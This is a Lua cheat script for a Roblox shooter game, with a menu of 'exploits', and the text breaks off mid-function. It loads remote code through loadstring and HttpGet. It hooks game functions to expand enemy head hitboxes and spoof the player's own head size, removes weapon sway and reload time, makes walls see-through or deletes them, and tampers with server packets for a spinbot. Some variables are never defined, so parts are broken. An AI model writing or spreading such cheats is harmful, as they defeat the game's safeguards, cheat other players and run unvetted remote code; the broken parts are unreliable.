
  
  warn(".  oooooooo8     o      ooooo       ooooo       oooo     oooo ooooooooooo")
  warn(".o888     88    888      888         888         8888o   888   888    88")
  warn(".888           8  88     888         888         88 888o8 88   888ooo8   ")
  warn(".888o     oo  8oooo88    888      o  888      o  88  888  88   888    oo")
  warn(". 888oooo88 o88o  o888o o888ooooo88 o888ooooo88 o88o  8  o88o o888ooo8888 ")




--// UI \\--

local repo = 'https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/'

local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()
local ThemeManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/addons/ThemeManager.lua"))()
local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()

local Window = Library:CreateWindow({
  Title = "callme.cc‚≠ê",
  Center = true,
  AutoShow = true,
  TabPadding = 8,
  MenuFadeTime = 0.2
})

local Tabs = {
    ['Combat'] = Window:AddTab('Combat'),
    ['Visuals'] = Window:AddTab('Visuals'),
    ['Misc'] = Window:AddTab('Misc'),
    ['Credits'] = Window:AddTab('Credits'),
    ['UI Settings'] = Window:AddTab('Configs'),
}





--// COMBAT \\--
local TabBox = Tabs.Combat:AddLeftTabbox()
local ExploitsTab = TabBox:AddTab('EXPLOITS')


local longneck = {
    LongNeckEnabled = false,
    UpperLimitDefault = 3,
    LowerLimitDefault = 1.75,
    CurrentSliderValue = 1.75,
    }
    
    ExploitsTab:AddToggle('LongNeck', {Text = 'long neck', Default = false, Tooltip}):AddKeyPicker('LongNeckKey', {Default = 'Non', SyncToggleState = true, Mode = 'Toggle', Text = 'Long Neck', NoUI = false}):OnChanged(function(value)
    longneck.LongNeckEnabled = value
    if not longneck.LongNeckEnabled then
    game:GetService("Workspace").Ignore.LocalCharacter.Bottom.PrismaticConstraint.UpperLimit = longneck.UpperLimitDefault
    game:GetService("Workspace").Ignore.LocalCharacter.Bottom.PrismaticConstraint.LowerLimit = longneck.LowerLimitDefault
    else
    game:GetService("Workspace").Ignore.LocalCharacter.Bottom.PrismaticConstraint.UpperLimit = longneck.CurrentSliderValue
    game:GetService("Workspace").Ignore.LocalCharacter.Bottom.PrismaticConstraint.LowerLimit = longneck.CurrentSliderValue
    end
    end)
    
    ExploitsTab:AddSlider('HeightChangerSlider', {Text = 'height:', Suffix = "m", Default = 4, Min = 0, Max = 8; Rounding = 1, Compact = false}):OnChanged(function(Value)
    longneck.CurrentSliderValue = Value
    if longneck.LongNeckEnabled then
    game:GetService("Workspace").Ignore.LocalCharacter.Bottom.PrismaticConstraint.LowerLimit = Value
    game:GetService("Workspace").Ignore.LocalCharacter.Bottom.PrismaticConstraint.UpperLimit = Value
    end
    end)

    local HeadHitboxTabBox = Tabs.Combat:AddLeftTabbox('head hitbox')
    local HeadHitboxTab = HeadHitboxTabBox:AddTab('head hitbox')
    
    local antihitbox
    antihitbox = hookmetamethod(game, "__index", newcclosure(function(...)
    local self, k = ...
    if not checkcaller() and k == "Size" and self.Name == "Head" then
      return Vector3.new(1.672248125076294, 0.835624098777771, 0.835624098777771)
    end
    return antihitbox(...)
    end))
    
    --* Head Hitbox Expander *--
    
    local HedsOn = Instance.new("Part")
    HedsOn.Name = "HedsOn"
    HedsOn.Anchored = false
    HedsOn.CanCollide = false
    HedsOn.Transparency = 0
    HedsOn.Size = Vector3.new(10, 10, 10)
    HedsOn.Parent = game.ReplicatedStorage
    
    local HeadExtends = false
    local XSize = 10
    local YSize = 10
    local ZSize = 10
    local HitboxTransparency = 10
    
    HeadHitboxTab:AddToggle('HBO',{Text='enabled',Default=false}):OnChanged(function(Value)
    HeadExtends = Value
    end)
    
    HeadHitboxTab:AddSlider('HitboxXSize_Slider', {Text = 'hitbox width:', Default = 5, Min = 0, Max = 10, Rounding = 2, Suffix = "%", Compact = false}):OnChanged(function(HitboxXSize)
    XSize = HitboxXSize
    end)
    
    HeadHitboxTab:AddSlider('HitboxYSize_Slider', {Text = 'hitbox height:', Default = 5, Min = 0, Max = 10, Rounding = 2, Suffix = "%", Compact = false}):OnChanged(function(HitboxYSize)
    YSize = HitboxYSize
    end)
    
    HeadHitboxTab:AddSlider('HitboxXSize_Slider', {Text = 'transparency:', Default = 10, Min = 0, Max = 60, Rounding = 0, Suffix = "%", Compact = false}):OnChanged(function(TransparencyValue)
    HitboxTransparency = TransparencyValue / 100
    end)
    
    task.spawn(function()
    while task.wait() do
      if HeadExtends then
        for _, i in ipairs(game:GetService("Workspace"):GetChildren()) do
          if i:FindFirstChild("HumanoidRootPart") and not i:FindFirstChild("HedsOn") then
            local BigHeadsPart = Instance.new("Part")
            BigHeadsPart.Name = "Head"
            BigHeadsPart.Anchored = false
            BigHeadsPart.CanCollide = false
            BigHeadsPart.Transparency = HitboxTransparency
            BigHeadsPart.Size = Vector3.new(XSize, YSize, ZSize)
            local DeletePart = Instance.new("Weld")
            DeletePart.Parent = BigHeadsPart
            DeletePart.Name = "FAKEHEAD"
            local HeadsParts = BigHeadsPart:Clone()
            HeadsParts.Parent = i
            HeadsParts.Orientation = i.HumanoidRootPart.Orientation
            local clonedHedsOn = HedsOn:Clone()
            clonedHedsOn.Parent = i
            local Headswelding = Instance.new("Weld")
            Headswelding.Parent = HeadsParts
            Headswelding.Part0 = i.HumanoidRootPart
            Headswelding.Part1 = HeadsParts
            HeadsParts.Position = Vector3.new(i.HumanoidRootPart.Position.X, i.HumanoidRootPart.Position.Y - 0.6, i.HumanoidRootPart.Position.Z)
          end
        end
      else
        for _, i in ipairs(game:GetService("Workspace"):GetChildren()) do
          if i:FindFirstChild("HumanoidRootPart") and i:FindFirstChild("HedsOn") then
            i.HedsOn:Remove()
            for _, a in ipairs(i:GetChildren()) do
              if a.Name == "Head" and a:FindFirstChild("FAKEHEAD") and (not a:FindFirstChild("Nametag") or not a:FindFirstChild("Face")) then
                a:Remove()
              end
            end
          end
        end
      end
    end
    end)
    












local CustomHitsoundsTabBox = Tabs.Misc:AddLeftTabbox('Custom Hitsounds')
local PlayerHitsoundsTab = CustomHitsoundsTabBox:AddTab('Player Hitsounds')
local NatureHitsoundsTab = CustomHitsoundsTabBox:AddTab('Nature Hitsounds')

local sounds = {
  ["Defualt Headshot Hit"] = "rbxassetid://9119561046",
  ["Defualt Body Hit"] = "rbxassetid://9114487369",
  ["Defualt Wood Hit"] = "rbxassetid://9125573608",
  ["Defualt Rock Hit"] = "rbxassetid://9118630389",
  Neverlose = "rbxassetid://8726881116",
  Gamesense = "rbxassetid://4817809188",
  One = "rbxassetid://7380502345",
  Bell = "rbxassetid://6534947240",
  Rust = "rbxassetid://1255040462",
  TF2 = "rbxassetid://2868331684",
  Slime = "rbxassetid://6916371803",
  ["Among Us"] = "rbxassetid://5700183626",
  Minecraft = "rbxassetid://4018616850",
  ["CS:GO"] = "rbxassetid://6937353691",
  Saber = "rbxassetid://8415678813",
  Baimware = "rbxassetid://3124331820",
  Osu = "rbxassetid://7149255551",
  ["TF2 Critical"] = "rbxassetid://296102734",
  Bat = "rbxassetid://3333907347",
  ["Call of Duty"] = "rbxassetid://5952120301",
  Bubble = "rbxassetid://6534947588",
  Pick = "rbxassetid://1347140027",
  Pop = "rbxassetid://198598793",
  Bruh = "rbxassetid://4275842574",
  Bamboo = "rbxassetid://3769434519",
  Crowbar = "rbxassetid://546410481",
  Weeb = "rbxassetid://6442965016",
  Beep = "rbxassetid://8177256015",
  Bambi = "rbxassetid://8437203821",
  Stone = "rbxassetid://3581383408",
  ["Old Fatality"] = "rbxassetid://6607142036",
  Click = "rbxassetid://8053704437",
  Ding = "rbxassetid://7149516994",
  Snow = "rbxassetid://6455527632",
  Laser = "rbxassetid://7837461331",
  Mario = "rbxassetid://2815207981",
  Steve = "rbxassetid://4965083997",
  Snowdrake = "rbxassetid://7834724809"
  }

local SoundService = game:GetService("SoundService")

SoundService.PlayerHitHeadshot.Volume = 5
SoundService.PlayerHitHeadshot.Pitch = 1
SoundService.PlayerHitHeadshot.EqualizerSoundEffect.HighGain = -2

-- GAME 
PlayerHitsoundsTab:AddToggle('Enabled_Toggle1', {Text = 'Enabled', Default = false})

PlayerHitsoundsTab:AddDropdown('HeadshotHit', {Values = { 'Defualt Headshot Hit','Neverlose','Gamesense','One','Bell','Rust','TF2','Slime','Among Us','Minecraft','CS:GO','Saber','Baimware','Osu','TF2 Critical','Bat','Call of Duty','Bubble','Pick','Pop','Bruh','Bamboo','Crowbar','Weeb','Beep','Bambi','Stone','Old Fatality','Click','Ding','Snow','Laser','Mario','Steve','Snowdrake' },Default = 1, Multi = false, Text = 'Head Hitsound:'})
Options.HeadshotHit:OnChanged(function()
local soundId = sounds[Options.HeadshotHit.Value]
game:GetService("SoundService").PlayerHitHeadshot.SoundId = soundId
end)

PlayerHitsoundsTab:AddSlider('Volume_Slider', {Text = 'Volume', Default = 5, Min = 0, Max = 10, Rounding = 0, Compact = true,}):OnChanged(function(vol)
SoundService.PlayerHitHeadshot.Volume = vol
end)

PlayerHitsoundsTab:AddSlider('Pitch_Slider', {Text = 'Pitch', Default = 1, Min = 0, Max = 2, Rounding = 1, Compact = true,}):OnChanged(function(pich)
SoundService.PlayerHitHeadshot.Pitch = pich
end)
--
PlayerHitsoundsTab:AddToggle('Enabled_Toggle2', {Text = 'Enabled', Default = false})

PlayerHitsoundsTab:AddDropdown('Hit', {Values = { 'Defualt Body Hit','Neverlose','Gamesense','One','Bell','Rust','TF2','Slime','Among Us','Minecraft','CS:GO','Saber','Baimware','Osu','TF2 Critical','Bat','Call of Duty','Bubble','Pick','Pop','Bruh','Bamboo','Crowbar','Weeb','Beep','Bambi','Stone','Old Fatality','Click','Ding','Snow','Laser','Mario','Steve','Snowdrake' },Default = 1, Multi = false, Text = 'Body Hitsound:'})
Options.Hit:OnChanged(function()
local soundId = sounds[Options.Hit.Value]
game:GetService("SoundService").PlayerHit2.SoundId = soundId
end)

PlayerHitsoundsTab:AddSlider('Volume_Slider', {Text = 'Volume', Default = 5, Min = 0, Max = 10, Rounding = 0, Compact = true,}):OnChanged(function(vole)
SoundService.PlayerHit2.Volume = vole
end)

PlayerHitsoundsTab:AddSlider('Pitch_Slider', {Text = 'Pitch', Default = 1, Min = 0, Max = 2, Rounding = 1, Compact = true,}):OnChanged(function(piche)
SoundService.PlayerHit2.Pitch = piche
end)

--* Nature Hitsounds *--

NatureHitsoundsTab:AddToggle('Enabled_Toggle2', {Text = 'Enabled', Default = false})

NatureHitsoundsTab:AddDropdown('WoodHit', {Values = { 'Defualt Wood Hit','Neverlose','Gamesense','One','Bell','Rust','TF2','Slime','Among Us','Minecraft','CS:GO','Saber','Baimware','Osu','TF2 Critical','Bat','Call of Duty','Bubble','Pick','Pop','Bruh','Bamboo','Crowbar','Weeb','Beep','Bambi','Stone','Old Fatality','Click','Ding','Snow','Laser','Mario','Steve','Snowdrake' },Default = 1, Multi = false, Text = 'Wood Hitsound:'})
Options.WoodHit:OnChanged(function()
local soundId = sounds[Options.WoodHit.Value]
game:GetService("SoundService").WoodHit.SoundId = soundId
end)

NatureHitsoundsTab:AddSlider('Volume_Slider', {Text = 'Volume', Default = 5, Min = 0, Max = 10, Rounding = 0, Compact = true,}):OnChanged(function(vole)
SoundService.WoodHit.Volume = vole
end)

NatureHitsoundsTab:AddSlider('Pitch_Slider', {Text = 'Pitch', Default = 1, Min = 0, Max = 2, Rounding = 1, Compact = true,}):OnChanged(function(piche)
SoundService.WoodHit.Pitch = piche
end)
--
NatureHitsoundsTab:AddToggle('Enabled_Toggle1', {Text = 'Enabled', Default = false})

NatureHitsoundsTab:AddDropdown('RockHit', {Values = { 'Defualt Rock Hit','Neverlose','Gamesense','One','Bell','Rust','TF2','Slime','Among Us','Minecraft','CS:GO','Saber','Baimware','Osu','TF2 Critical','Bat','Call of Duty','Bubble','Pick','Pop','Bruh','Bamboo','Crowbar','Weeb','Beep','Bambi','Stone','Old Fatality','Click','Ding','Snow','Laser','Mario','Steve','Snowdrake' },Default = 1, Multi = false, Text = 'Rock Hitsound:'})
Options.RockHit:OnChanged(function()
local soundId = sounds[Options.RockHit.Value]
game:GetService("SoundService").RockHit.SoundId = soundId
end)

NatureHitsoundsTab:AddSlider('Volume_Slider', {Text = 'Volume', Default = 5, Min = 0, Max = 10, Rounding = 0, Compact = true,}):OnChanged(function(vol)
SoundService.RockHit.Volume = vol
end)

NatureHitsoundsTab:AddSlider('Pitch_Slider', {Text = 'Pitch', Default = 1, Min = 0, Max = 2, Rounding = 1, Compact = true,}):OnChanged(function(pich)
SoundService.RockHit.Pitch = pich
end)











--// VISUALS \\--


local ArmVisTabBox = Tabs.Visuals:AddRightTabbox('arm visuals')
local ArmVisTab = ArmVisTabBox:AddTab('local chams')
  
  --// Silent Aim -()
  

--* Fov Circle *--


--// Fov Switches


--// Silent Aim Switches


--// Silent Aim


--Init Functions


--Esp Switches



local SkinChangerTabBox = Tabs.Visuals:AddRightTabbox('skinbox')
local SkinChangerTab = SkinChangerTabBox:AddTab('skinbox')

--* Skinbox *--

local SkinChoice = "Galaxy"
local SkinsEnabled = false

function CheckSkins()
local tbl = {}
for i, v in pairs(game:GetService("ReplicatedStorage").ItemSkins:GetChildren()) do
table.insert(tbl, v.Name)
end
return tbl
end
function SetCammo(SkinName)
if not require(game:GetService("ReplicatedStorage").ItemConfigs[getrenv()._G.modules.FPS.GetEquippedItem().id]).HandModel then
return
end
local GunName = require(game:GetService("ReplicatedStorage").ItemConfigs[getrenv()._G.modules.FPS.GetEquippedItem().id]).HandModel
if table.find(CheckSkins(), GunName) then
local SkinFolder = game:GetService("ReplicatedStorage").ItemSkins[GunName]
local AnimationModule = require(SkinFolder:FindFirstChild("AnimatedSkinPrefab"))
if SkinName == "Lightning" then
AnimationModule.ApplyToModel(workspace.Ignore.FPSArms.HandModel, "rbxassetid://6555500992", 1, 0.3)
elseif SkinName == "Galaxy" then
AnimationModule.ApplyToModel(workspace.Ignore.FPSArms.HandModel, "rbxassetid://9305457875", 1, 0.3)
elseif SkinName == "Swirl" then
AnimationModule.ApplyToModel(workspace.Ignore.FPSArms.HandModel, "rbxassetid://13199296652", 1, 0.3)
elseif SkinName == "Wavey" then
AnimationModule.ApplyToModel(workspace.Ignore.FPSArms.HandModel, "rbxassetid://13898657945", 1, 0.3)
elseif SkinName == "RedGalaxy" then
AnimationModule.ApplyToModel(workspace.Ignore.FPSArms.HandModel, "rbxassetid://1619172543", 1, 0.3)
elseif SkinName == "Marble" then
AnimationModule.ApplyToModel(workspace.Ignore.FPSArms.HandModel, "rbxassetid://8904067198", 1, 0.01)
elseif SkinName == "Lava" then
AnimationModule.ApplyToModel(workspace.Ignore.FPSArms.HandModel, "rbxassetid://7077560268", 1, 0.3)
elseif SkinName == "Blackout" then
AnimationModule.ApplyToModel(workspace.Ignore.FPSArms.HandModel, "rbxassetid://5847588525", 1, 0.3)
elseif SkinName == "Snake" then
AnimationModule.ApplyToModel(workspace.Ignore.FPSArms.HandModel, "rbxassetid://7457460026", 1, 0.3)
elseif SkinName == "Banana" then
AnimationModule.ApplyToModel(workspace.Ignore.FPSArms.HandModel, "rbxassetid://338693178", 2, 0.3)
elseif SkinName == "Death" then
AnimationModule.ApplyToModel(workspace.Ignore.FPSArms.HandModel, "rbxassetid://11896030190", 1, 0.3)
end
end
end
game:GetService("Workspace").Ignore.FPSArms.ChildAdded:Connect(function()
if game:GetService("Workspace").Ignore.FPSArms:WaitForChild("HandModel") and SkinsEnabled == true then
SetCammo(SkinChoice)
end
end)

SkinChangerTab:AddToggle('SkinsEnabled', {Text = 'enabled', Default = false}):OnChanged(function(value)
SkinsEnabled = value
end)
SkinChangerTab:AddDropdown('SkinChoice', {Values = {"Lightning", "Galaxy", "Swirl", "Wavey", "RedGalaxy", "Marble", "Lava", "Blackout", "Snake", "Banana", "Death"}, Default = 1, Multi = false, Text = 'custom skins:'}):OnChanged(function(value)
SkinChoice = value
end)


local FieldOfViewTabBox = Tabs.Visuals:AddRightTabbox('field of view')
local FieldOfViewTab = FieldOfViewTabBox:AddTab('field of view')

--* Field Of View *--

local varsglobal = {
    visuals = {
        FovChanger = true, 
        FovAdd = 120,
        OldFov = workspace.CurrentCamera.FieldOfView,
        ZoomAmt = 0,
        FovZoom = false,
    },
}

local function updateFOV()
    if varsglobal.visuals.FovChanger then
        workspace.CurrentCamera.FieldOfView = varsglobal.visuals.OldFov + varsglobal.visuals.FovAdd
    else
        workspace.CurrentCamera.FieldOfView = varsglobal.visuals.OldFov
    end
end
game:GetService("RunService").RenderStepped:Connect(updateFOV)


local TrashTalkTabBox = Tabs.Misc:AddRightTabbox('trash talk')
local TrashTalkTab = TrashTalkTabBox:AddTab('trash talk')

--* Trash Talk *--


local CustomSkyTabBox = Tabs.Visuals:AddLeftTabbox('lighting')
local CustomSkyTab = CustomSkyTabBox:AddTab('lighting')

--* Lighting *--
local LightingEnabled = nil

CustomSkyTab:AddToggle('AWASZnfh', {Text = "enabled",Default = false,Tooltip = "Enables SkyTab",}):OnChanged(function(EnabledLighting)
LightingEnabled = EnabledLighting
end)

CustomSkyTab:AddToggle('z1AWASZnfh', {Text = "remove shadows",Default = false,Tooltip = "Global Shadows On/Off",}):OnChanged(function(GlobalShadowsToggle)
if LightingEnabled and GlobalShadowsToggle == true then
sethiddenproperty(game:GetService("Lighting"), "GlobalShadows", false)
elseif LightingEnabled and GlobalShadowsToggle == false then
sethiddenproperty(game:GetService("Lighting"), "GlobalShadows", true)
end
end)

CustomSkyTab:AddToggle('51z1AWASZnfh', {Text = "remove fog",Default = false,Tooltip = "Fog On/Off",}):OnChanged(function(RemoveFogToggle)
if LightingEnabled and RemoveFogToggle == true then
sethiddenproperty(game:GetService("Lighting"), "FogStart", math.huge)
elseif LightingEnabled and RemoveFogToggle == false then
sethiddenproperty(game:GetService("Lighting"), "FogStart", 150)
end
end)

CustomSkyTab:AddToggle('5za1z1AWASZnfh', {Text = "remove clouds",Default = false,Tooltip = "Clouds On/Off",}):OnChanged(function(RemoveCloudsToggle)
if LightingEnabled and RemoveCloudsToggle == true then
sethiddenproperty(game:GetService("Workspace").Terrain.Clouds, "Enabled", false)
elseif LightingEnabled and RemoveCloudsToggle == false then
sethiddenproperty(game:GetService("Workspace").Terrain.Clouds, "Enabled", true)
end
end)

CustomSkyTab:AddToggle('Grass', {Text = 'remove grass',Default = false,Tooltip = "Grass On/Off",}):OnChanged(function(GrassRemove)
if LightingEnabled and GrassRemove == true then
sethiddenproperty(game.Workspace.Terrain, "Decoration", false)
elseif LightingEnabled and GrassRemove == false then
sethiddenproperty(game.Workspace.Terrain, "Decoration", true)
end
end)

local GCEN = Color3.fromRGB(95, 100, 49)
local GRCEND = false

CustomSkyTab:AddToggle('CLRG', {Text = 'grass color', Default = true, Tooltip = "Off/On"}):AddColorPicker('ColorGrass', {Default = GCEN, Title = 'Changer Color Grass'})
Toggles.CLRG:OnChanged(function(T)
GRCEND = T
game:GetService("Workspace").Terrain:SetMaterialColor(Enum.Material.Grass, T and GCEN or Color3.fromRGB(95, 100, 49))
end)
Options.ColorGrass:OnChanged(function(Grass1)
if GRCEND then
GCEN = Grass1
game:GetService("Workspace").Terrain:SetMaterialColor(Enum.Material.Grass, Grass1)
end
end)

local CloudsColor = Color3.fromRGB(255, 255, 255)
local EnableCustomColor = false

CustomSkyTab:AddToggle('CLRG1', {Text = 'clouds color', Default = EnableCustomColor, Tooltip = "Off/On"}):AddColorPicker('ColorGrass1', {Default = CloudsColor, Title = 'Change Clouds Color'})
Toggles.CLRG1:OnChanged(function(T)
EnableCustomColor = T
game:GetService("Workspace").Terrain.Clouds.Color = T and CloudsColor or Color3.fromRGB(255, 255, 255)
end)
Options.ColorGrass1:OnChanged(function(NewColor)
if LightingEnabled and EnableCustomColor then
CloudsColor = NewColor
game:GetService("Workspace").Terrain.Clouds.Color = NewColor
end
end)

local Lighting = game:GetService("Lighting")
local ColorCorrection = Lighting:FindFirstChild("ColorCorrection")
if not ColorCorrection then
ColorCorrection = Instance.new("ColorCorrectionEffect")
ColorCorrection.Name = "ColorCorrection"
ColorCorrection.Parent = Lighting
end

CustomSkyTab:AddToggle('CLRG1', {Text = 'ambient', Default = EnableCustomColor, Tooltip = "Off/On"}):AddColorPicker('ColorAmbient1', {Default = Color3.fromRGB(255, 255, 255), Title = 'Change Ambient Color'})
Options.ColorAmbient1:OnChanged(function(NewColor2)
sethiddenproperty(ColorCorrection, "TintColor", NewColor2)
end)

CustomSkyTab:AddSlider('Exposure_sUS', {Text = 'exposure', Suffix = "%", Default = 0, Min = -5, Max = 5, Rounding = 1, Compact = true}):OnChanged(function(ExposureValue)
if LightingEnabled and sethiddenproperty(game:GetService("Lighting"), "ExposureCompensation", ExposureValue) then
end
end)

CustomSkyTab:AddSlider('Saturation_sUS', {Text = 'saturation',Suffix = "%",Default = 0,Min = -5,Max = 5,Rounding = 1,Compact = true}):OnChanged(function(SaturationValue)
if sethiddenproperty(ColorCorrection, "Saturation", SaturationValue) then
end
end)

CustomSkyTab:AddDropdown('World_Technology', {Values = { 'Technology', 'ShadowMap', 'Voxel', 'Compatibility' },Default = 1,Multi = false,Text = 'technology:',Tooltip = 'Game Technology',}):OnChanged(function(GPHZ)
if LightingEnabled and GPHZ == "Technology" then
sethiddenproperty(game.Lighting, "Technology", Enum.Technology.Future)
elseif LightingEnabled and GPHZ == "ShadowMap" then
sethiddenproperty(game.Lighting, "Technology", Enum.Technology.ShadowMap)
elseif LightingEnabled and GPHZ == "Voxel" then
sethiddenproperty(game.Lighting, "Technology", Enum.Technology.Voxel)
elseif LightingEnabled and GPHZ == "Compatibility" then
sethiddenproperty(game.Lighting, "Technology", Enum.Technology.Compatibility)
end
end)

local Sky = Instance.new("Sky",game:GetService("Lighting"))
CustomSkyTab:AddDropdown('World_Skybox', {Values = { 'Default', 'Neptune', 'Among Us', 'Nebula', 'Vaporwave', 'Clouds', 'Twilight', 'DaBaby', 'Minecraft', 'Chill', 'Redshift', 'Blue Stars', 'Blue Aurora' },Default = 1,Multi = false,Text = 'custom skybox:',Tooltip = 'Sky Changer',}):OnChanged(function(World_Skybox)
if LightingEnabled and lighting:FindFirstChild("Sky") then
lighting.Sky.SkyboxBk = skybox_assets[World_Skybox].SkyboxBk
lighting.Sky.SkyboxDn = skybox_assets[World_Skybox].SkyboxDn
lighting.Sky.SkyboxFt = skybox_assets[World_Skybox].SkyboxFt
lighting.Sky.SkyboxLf = skybox_assets[World_Skybox].SkyboxLf
lighting.Sky.SkyboxRt = skybox_assets[World_Skybox].SkyboxRt
lighting.Sky.SkyboxUp = skybox_assets[World_Skybox].SkyboxUp
end
end)



--// LOCAL \\--
local RightGroupBox = Tabs.Credits:AddRightGroupbox('MADE BY')
RightGroupBox:AddLabel('‚úòCallmekujo‚úò')


local RightGroupBox = Tabs.Credits:AddLeftGroupbox('CREDIT')
RightGroupBox:AddLabel('‚úòCallmesonic‚úò')

local RightGroupBox = Tabs.Credits:AddLeftGroupbox('SCRIPTER')
RightGroupBox:AddLabel('‚úòCallmeKujo‚úò')




local RightGroupBox = Tabs.Credits:AddRightGroupbox('DISCORD')
RightGroupBox:AddLabel('https://discord.gg/sywX7uE9mj')

--// MISC \\-- fix \\-- 
local RightGroupBox = Tabs.Misc:AddRightGroupbox('FREE CAM')
RightGroupBox:AddLabel('T = FREE CAM')


local TabBox = Tabs.Combat:AddRightTabbox()
local MiscTab = TabBox:AddTab('MODS')






MiscTab:AddToggle('', {Text = "Jump Crouch",Default = false,}):AddKeyPicker('JumpCrouchKey', {Default='Non',SyncToggleState=true,Mode='Toggle',Text='Jump Crouch',NoUI=false})
local stoprun = false
task.spawn(function()
while true do
  local state = Options.JumpCrouchKey:GetState()
  if state then
    keypress(0x57)
    keypress(0x10)
    wait(0.05)
    keypress(0x43)
    keypress(0x20)
    keyrelease(0x20)
    wait(0.5)
    keyrelease(0x43)
    wait(1)
  end
  if Library.Unloaded then break end
  wait()
end
end)
task.spawn(function()
while task.wait() do
  local state = Options.JumpCrouchKey:GetState()
  if not state then
    if stoprun then
      keyrelease(0x57)
      keyrelease(0x10)
      stoprun = false
    end
  else
    stoprun = true
  end
end
end)

MiscTab:AddToggle('LootAll',{Text='Loot All',Default=false}):AddKeyPicker('LootAllKey', {Default='Non',SyncToggleState=true,Mode='Toggle',Text='Loot All',NoUI=false})

Toggles.LootAll:OnChanged(function()
  for i = 1, 20 do
      game:GetService("Players").LocalPlayer.RemoteEvent:FireServer(12, i, true)
  end
end)

local XRAY22 = false
MiscTab:AddToggle('XRAY', {Text = 'XRAY', Default = false}):AddKeyPicker('XRAYKey', {Default='Non',SyncToggleState=true,Mode='Toggle',Text='XRAY',NoUI=false}):OnChanged(function()
    XRAY22 = Toggles.XRAY.Value
    if XRAY22 then
        for i,v in pairs(game:GetDescendants()) do
            if v:FindFirstChild("Hitbox") then
                v.Hitbox.Transparency = 0.6
            end
        end
    else
        for i,v in pairs(game:GetDescendants()) do
            if v:FindFirstChild("Hitbox") then
                v.Hitbox.Transparency = 0
            end
        end
    end
end)
MiscTab:AddLabel('deposit all'):AddKeyPicker('gazkb', { Default = 'Non', SyncToggleState = false, Mode = 'Toggle', Text = 'deposit all', NoUI = true })
Options.gazkb:OnClick(function()
for i = 1, 20 do
wait(0.03)
local ohNumber1 = 12
local ohNumber2 = i
local ohBoolean3 = false
game:GetService("Players").LocalPlayer.RemoteEvent:FireServer(ohNumber1, ohNumber2, ohBoolean3)
end
end)


local NoSlowDown = false
local old = getrenv()._G.modules.Character.SetSprintBlocked
ExploitsTab:AddToggle('NOSLOWDOWN',{Text='no slowdown',Default=false}):OnChanged(function(Value)
NoSlowDown = Value
getrenv()._G.modules.Character.SetSprintBlocked = function(...)
local args = {...}
if NoSlowDown then
  args[1] = false
  return old(unpack(args))
end
return old(...)
end
end)

local Misc = {
Settings = {
  JumpShoot = false,
  NoADS = false,
}
}

ExploitsTab:AddToggle('JumpShoot',{Text='jump shoot',Default=false}):OnChanged(function(Value)
Misc.Settings.JumpShoot = Value
end)
local oldIsGrounded;oldIsGrounded = hookfunction(getrenv()._G.modules.Character.IsGrounded,function(...)
if Misc.Settings.JumpShoot == true then
return true
else
return oldIsGrounded(...)
end
end)

ExploitsTab:AddToggle('NoADS',{Text='no ads',Default=false}):OnChanged(function(Value)
Misc.Settings.NoADS = Value
end)
local oldNoADS;oldNoADS = hookfunction(getrenv()._G.modules.Camera.SetVMAimingOffset,function(...)
if Misc.Settings.NoADS == true then
return true
else
return oldNoADS(...)
end
end)

local NoSway = false
ExploitsTab:AddToggle('NoSway',{Text='no sway',Default=false}):OnChanged(function(Value)
NoSway = Value
end)
local NoSwayHook;NoSwayHook = hookfunction(getrenv()._G.modules.Camera.SetSwaySpeed,function(...)
local args = {...}
if NoSway == true then
args[1] = 0
return NoSwayHook(unpack(args))
end
return NoSwayHook(...)
end)

ExploitsTab:AddToggle('NoReloadAnimation',{Text='no reload animation',Default=false}):OnChanged(function(Value)
gunMods.noReloadanimTog = Value
end)
local reloadDuringShoot;reloadDuringShoot = hookfunction(getupvalues(getrenv()._G.modules.FPS.ToolControllers.RangedWeapon.PlayerFire)[1],function(...)
local arg = {...}
if gunMods.noReloadanimTog == true then
arg[2]['ReloadTime'] = 0
return reloadDuringShoot(unpack(arg))
end
return reloadDuringShoot(...)
end)

ExploitsTab:AddToggle('ArrowGun', {Text = 'arrow gun',Default = false}):OnChanged(function(ArrowValue)
for I, V in pairs(getgc(true)) do
if type(V) == "table" and rawget(V, "TracerPart") then
  if ArrowValue == true then
    V.TracerPart = "Arrow"
  elseif ArrowValue == false then
    V.TracerPart = "Bullet"
  end
end
end
end)


local deleteWallsEnabled = false
ExploitsTab:AddToggle('', {Text = "delete walls",Default = false,Tooltip = "Left Click / Mouse Button 2 (MB2)",}):AddKeyPicker('', {Default='MB2',SyncToggleState=true,Mode='Toggle',Text='Delete Walls',NoUI=true}):OnChanged(function(value)
deleteWallsEnabled = value
end)

local Mouse = game.Players.LocalPlayer:GetMouse()
Mouse.Button1Down:connect(function()
if deleteWallsEnabled then
if not Mouse.Target then
  return
end
local targetName = Mouse.Target.Name
local allowedNames = {"Hitbox", "LeftWall", "RightWall", "LeftHinge", "Prim", "RightHinge"}
for _, name in ipairs(allowedNames) do
  if targetName == name then
    Mouse.Target:Destroy()
    break
  end
end
end
end)



local SpinbotTabBox = Tabs.Combat:AddRightTabbox('spinbot')
local SpinbotTab = SpinbotTabBox:AddTab('spinbot')

--* Spinbot *--

local fakeduck = false
local Spinbot = false
local SpinbotSpeed = 3
local SpinbotType = "Normal"
local value = 1
local SpinBotLM = false
local SpinBotV = false
SpinbotTab:AddToggle('Spinbot',{Text='enabled',Default=false}):OnChanged(function(Value)
Spinbot = Value
end)

SpinbotTab:AddSlider('SpinbotSpeed', {Text='speed:',Default=3,Min=1,Max=3,Rounding=0,Compact=false,Thickness = 3}):OnChanged(function(Value)
SpinbotSpeed = Value
end)

SpinbotTab:AddDropdown('SpinbotType', {Values = {"Normal", "Desync", "Random"},Default = 1,Multi = false,Text = 'type:'}):OnChanged(function(Value)
SpinbotType = Value
end)

local OldSpinHook
OldSpinHook = hookfunction(game.Players.LocalPlayer:FindFirstChild("RemoteEvent").FireServer, function(self, ...)
local args = {...}
if args[1] and args[2] and args[1] == 1 and typeof(args[2]) == "Vector3" and args[4] and Spinbot == true then
  if SpinBotLM == true and SpinbotType == "Desync" then
    args[4] = value
    value = value + SpinbotSpeed
  elseif SpinbotType == "Normal" or SpinBotLM == false then
    args[4] = value
    value = value - SpinbotSpeed
  end
end
if args[1] and args[2] and args[1] == 1 and typeof(args[2]) == "Vector3" and args[4] and Spinbot == true then
  if SpinBotV == true and SpinbotType == "Desync" then
